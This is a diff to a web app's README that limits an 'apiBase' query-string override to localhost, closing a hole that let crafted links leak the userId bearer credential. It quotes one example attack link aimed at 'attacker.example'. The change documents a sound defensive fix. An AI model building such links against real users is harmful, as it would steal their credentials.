@@ -39,14 +39,20 @@ mailbox IDs for the same credentials and nothing will ever show up in the list.
 
 `index.html` sets `window.DROP_API_BASE` before `app.js` loads, defaulting to the production
 relay (`https://flare576.com/drop/api`). It can be overridden per-page-load via a query
-string, with no code changes and nothing to persist:
+string, but **only when the page itself is served from `localhost`/`127.0.0.1`**:
 
 ```
-index.html?apiBase=http://localhost:8080/drop/api
+http://localhost:8080/?apiBase=http://localhost:8081/drop/api
 ```
 
-This is not a secret — it's just a URL — so a query param is fine; it deliberately does not
-use `localStorage`/`sessionStorage` for consistency with the credential-handling rule below.
+The override is intentionally restricted to local dev hosts, not "any URL is fine because
+it's not a secret." `userId` in the URL path is this app's bearer credential for list/read/
+delete (see api/README.md) — an unrestricted override would let a crafted link
+(`https://flare576.com/?apiBase=https://attacker.example/drop/api`) silently redirect that
+credential to an attacker-controlled host on page load, before the user does anything (Beta
+QA finding I1). Restricting the override to `localhost`/`127.0.0.1` keeps the convenience for
+local testing while making it structurally impossible for a link to exploit this against the
+real production page, whose hostname is always `flare576.com`.
 
 ## Local testing
 
